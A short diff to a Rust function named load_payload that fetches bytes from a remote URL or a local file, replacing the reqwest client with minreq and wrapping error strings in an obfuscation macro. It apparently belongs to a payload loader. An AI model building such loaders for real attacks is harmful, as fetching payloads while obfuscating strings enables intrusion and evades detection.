@@ -10,11 +10,11 @@ pub fn load_payload() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
     };
     if address.starts_with("http://") || address.starts_with("https://") {
         // Remote loading
-        let response = reqwest::blocking::get(&address)?;
-        if !response.status().is_success() {
-            return Err(format!("{} {}", obf_lit!("HTTP request failed with status:"), response.status()).into());
+        let response = minreq::get(&address).send()?;
+        if response.status_code < 200 || response.status_code >= 300 {
+            return Err(format!("{} {}", obf_lit!("HTTP request failed with status:"), response.status_code).into());
         }
-        Ok(response.bytes()?.to_vec())
+        Ok(response.as_bytes().to_vec())
     } else {
         // Local file loading
         Ok(std::fs::read(&address)?)
